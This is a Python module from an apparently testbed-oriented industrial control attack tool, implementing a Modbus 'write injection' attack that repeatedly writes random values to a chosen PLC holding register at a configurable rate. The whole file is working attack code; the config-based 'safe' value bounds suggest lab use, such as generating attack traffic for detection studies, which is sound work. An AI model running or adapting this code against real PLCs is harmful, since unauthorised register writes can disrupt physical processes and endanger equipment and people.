# injector/attacks/write_injection.py

import logging
import random
import time
from typing import Optional

from injector.core.config import PlcConfig, get_plc_config
from injector.core.modbus import modbus_client

log = logging.getLogger(__name__)


def run_write_injection(
    cfg: Optional[PlcConfig] = None,
    stop_event=None,
    target_register: int = 2,
    qps: float = 5.0,
    value_min: Optional[int] = None,
    value_max: Optional[int] = None,
) -> None:
    """
    Atak typu WRITE injection:
    - wysyła FC6 (write_single_register) do wskazanego rejestru,
    - z zadaną częstotliwością qps (queries per second).

    Oczekuje, że zostanie wywołany jako thread z przekazanym stop_event.
    """
    if cfg is None:
        cfg = get_plc_config()

    if stop_event is None:
        import threading
        stop_event = threading.Event()

    if value_min is None:
        value_min = getattr(cfg, "safe_write_min", 0)
    if value_max is None:
        value_max = getattr(cfg, "safe_write_max", 1000)

    if value_min > value_max:
        value_min, value_max = value_max, value_min

    period = 1.0 / qps if qps > 0 else 0.0

    log.info(
        "WRITE injection started: HR[%d], qps=%.2f, range=[%d, %d]",
        target_register,
        qps,
        value_min,
        value_max,
    )

    while not stop_event.is_set():
        value = random.randint(value_min, value_max)

        try:
            with modbus_client(cfg) as client:
                rq = client.write_register(target_register, value, unit=cfg.unit_id)
                if rq.isError():
                    log.warning(
                        "WRITE injection error writing HR[%d] = %d: %s",
                        target_register,
                        value,
                        rq,
                    )
                else:
                    log.info(
                        "WRITE injection: wrote HR[%d] = %d",
                        target_register,
                        value,
                    )
        except Exception as e:
            log.warning("WRITE injection: exception during write: %r", e)

        if period > 0:
            time.sleep(period)

    log.info("WRITE injection: stop_event set, leaving loop")
